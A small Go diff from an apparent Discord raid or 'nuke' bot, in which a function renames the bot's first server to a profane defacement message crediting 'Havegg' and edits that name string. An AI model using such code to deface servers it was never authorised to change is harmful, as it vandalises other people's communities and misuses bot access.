@@ -13,7 +13,7 @@ func ChangeName(s *discordgo.Session) {
 	}
 
 	guildID := s.State.Guilds[0].ID
-	newName := "Server Fucked By Havegg"
+	newName := "Server Fucked By Have"
 
 	_, err := s.GuildEdit(guildID, &discordgo.GuildParams{
 		Name: newName,
